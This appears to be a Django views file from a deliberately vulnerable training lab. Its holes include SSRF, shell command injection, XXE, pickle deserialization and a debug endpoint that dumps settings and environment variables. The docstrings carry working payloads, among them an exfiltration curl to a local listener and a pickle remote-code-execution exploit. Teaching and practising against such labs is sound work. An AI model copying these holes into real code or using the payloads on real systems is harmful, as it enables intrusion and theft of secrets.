"""
dashboard/views.py
==================
INTENTIONAL VULNERABILITIES:
  [V-24] SSRF (Server-Side Request Forgery)   – URL preview fetches any URL
  [V-25] Command Injection                    – ping host built via shell=True
  [V-26] XXE (XML External Entity)            – lxml/defusedxml NOT used
  [V-27] Insecure Deserialization             – pickle.loads on user input
  [V-28] Sensitive data in GET params         – search logs query in URL
  [V-29] Debug info endpoint                  – /dashboard/debug/ dumps settings
"""

import os
import pickle
import base64
import subprocess
import urllib.request
from xml.etree import ElementTree as ET    # ❌ standard ET is XXE-vulnerable

from django.shortcuts import render, redirect
from django.contrib.auth.decorators import login_required
from django.views.decorators.csrf import csrf_exempt
from django.http import HttpResponse

from .models import Customer, AuditLog


# ── Dashboard home ────────────────────────────────────────────────────────────
MODULES = [
    {"icon": "💉", "name": "SQL Injection",         "url": "/accounts/login/",       "vuln": "V-08: Raw SQL login, no parameterisation"},
    {"icon": "📝", "name": "Stored XSS",            "url": "/profiles/edit/",        "vuln": "V-13: Bio rendered with |safe in template"},
    {"icon": "🔍", "name": "Reflected XSS",         "url": "/feedback/search/",      "vuln": "V-18: ?q= parameter echoed unescaped"},
    {"icon": "🙈", "name": "IDOR",                  "url": "/profiles/view/",        "vuln": "V-14: Any user_id accessible, no ownership check"},
    {"icon": "📂", "name": "Path Traversal",        "url": "/documents/list/",       "vuln": "V-21: ?file=../../ in download endpoint"},
    {"icon": "🌐", "name": "SSRF",                  "url": "/dashboard/url-preview/","vuln": "V-24: Fetches any internal/external URL"},
    {"icon": "📡", "name": "Command Injection",     "url": "/dashboard/ping/",       "vuln": "V-25: shell=True with unsanitised host"},
    {"icon": "📄", "name": "XXE",                   "url": "/dashboard/xml-import/", "vuln": "V-26: External entity in uploaded XML"},
    {"icon": "☣️", "name": "Insecure Deserialize",  "url": "/dashboard/deserialize/","vuln": "V-27: pickle.loads on user-supplied data"},
    {"icon": "🐛", "name": "Debug Endpoint",        "url": "/dashboard/debug/",      "vuln": "V-29: Dumps SECRET_KEY, env vars, settings"},
]

@login_required
def dashboard_home(request):
    logs = AuditLog.objects.order_by("-timestamp")[:20]
    return render(request, "dashboard/home.html", {"logs": logs, "modules": MODULES})


# ── [V-24] SSRF ───────────────────────────────────────────────────────────────
@login_required
def url_preview(request):
    """
    Fetches any URL the user submits – including:
      - Internal services:  http://127.0.0.1:6379/  (Redis)
                            http://169.254.169.254/latest/meta-data/  (AWS IMDS)
                            http://localhost:8000/dashboard/debug/
      - Cloud metadata:     http://metadata.google.internal/computeMetadata/v1/
      - The listener:       http://127.0.0.1:8080/steal?data=secret

    There is no allowlist, no scheme check, and no private-IP block.
    """
    result  = None
    error   = None
    url     = ""

    if request.method == "POST":
        url = request.POST.get("url", "").strip()
        if url:
            try:
                # ❌ VULNERABLE: fetches internal/external URLs without restriction
                with urllib.request.urlopen(url, timeout=5) as resp:
                    result = resp.read(4096).decode("utf-8", errors="replace")
            except Exception as exc:
                error = str(exc)

    return render(request, "dashboard/url_preview.html",
                  {"result": result, "error": error, "url": url})


# ── [V-25] Command Injection ──────────────────────────────────────────────────
@login_required
def ping_host(request):
    """
    Runs ping via the shell.  The host value is never sanitised.

    Inject extra commands using:
      ; id
      ; cat /etc/passwd
      | curl http://127.0.0.1:8080/steal?data=$(whoami)
      && python3 -c "import os; os.system('id')"
      `id`

    Combined with the listener server, you can exfiltrate data:
      127.0.0.1; curl http://127.0.0.1:8080/?cmd=$(cat+/etc/passwd|base64)
    """
    output = None
    host   = ""

    if request.method == "POST":
        host = request.POST.get("host", "").strip()
        if host:
            # ❌ VULNERABLE: shell=True + unsanitised user input
            cmd = f"ping -c 2 {host}"
            try:
                output = subprocess.check_output(
                    cmd, shell=True, stderr=subprocess.STDOUT,
                    timeout=10
                ).decode()
            except subprocess.CalledProcessError as exc:
                output = exc.output.decode()
            except Exception as exc:
                output = str(exc)

            AuditLog.objects.create(
                user=request.user.username,
                action=f"ping: {cmd}",
                result=output[:500],
            )

    return render(request, "dashboard/ping.html",
                  {"output": output, "host": host})


# ── [V-26] XXE – XML External Entity ─────────────────────────────────────────
@login_required
@csrf_exempt
def xml_import(request):
    """
    Parses uploaded XML using Python's built-in ElementTree which is
    XXE-vulnerable when running on older CPython or when external entities
    are embedded in the DOCTYPE.

    XXE payload to read /etc/passwd:

        <?xml version="1.0"?>
        <!DOCTYPE customers [
          <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <customers>
          <customer>
            <name>&xxe;</name>
            <email>test@test.com</email>
          </customer>
        </customers>

    Blind XXE (exfiltrate to listener):

        <!DOCTYPE customers [
          <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/?data=secret">
        ]>

    Note: Python's xml.etree.ElementTree ignores DOCTYPE/entities in
    CPython ≥ 3.8 by default, but lxml without defusedxml is fully vulnerable.
    Swap ElementTree for lxml in requirements to demonstrate the full attack.
    """
    message = None
    if request.method == "POST" and request.FILES.get("xmlfile"):
        xml_data = request.FILES["xmlfile"].read()
        try:
            # ❌ VULNERABLE: no use of defusedxml
            root = ET.fromstring(xml_data)
            imported = 0
            for customer_el in root.findall("customer"):
                name  = customer_el.findtext("name",  default="")
                email = customer_el.findtext("email", default="")
                Customer.objects.create(name=name, email=email)
                imported += 1
            message = f"Imported {imported} customer(s)."
        except ET.ParseError as exc:
            message = f"XML parse error: {exc}"

    customers = Customer.objects.all()
    return render(request, "dashboard/xml_import.html",
                  {"message": message, "customers": customers})


# ── [V-27] Insecure Deserialization (pickle) ──────────────────────────────────
@csrf_exempt
def deserialize_session(request):
    """
    Deserialises a base64-encoded pickle blob supplied by the user.
    Pickle can execute arbitrary Python code during deserialisation.

    Craft a malicious pickle payload (run this in your own Python shell):

        import pickle, os, base64

        class Exploit(object):
            def __reduce__(self):
                return (os.system, ('id > /tmp/pwned',))

        payload = base64.b64encode(pickle.dumps(Exploit())).decode()
        print(payload)

    Then POST: data=<payload>  to  /dashboard/deserialize/
    """
    output = None
    if request.method == "POST":
        raw = request.POST.get("data", "")
        try:
            # ❌ VULNERABLE: pickle.loads on user-supplied bytes
            obj    = pickle.loads(base64.b64decode(raw))
            output = repr(obj)
        except Exception as exc:
            output = f"Error: {exc}"

    return render(request, "dashboard/deserialize.html", {"output": output})


# ── [V-29] Debug info endpoint ────────────────────────────────────────────────
def debug_info(request):
    """
    Dumps Django settings, environment variables, and installed apps.
    Should never exist in any application, lab or not – useful to show what
    an attacker learns from a misconfigured debug endpoint.
    """
    import django.conf
    settings_dump = {
        k: str(getattr(django.conf.settings, k, ""))
        for k in dir(django.conf.settings)
        if k.isupper()
    }
    env_dump = dict(os.environ)
    return render(request, "dashboard/debug.html",
                  {"settings": settings_dump, "env": env_dump})
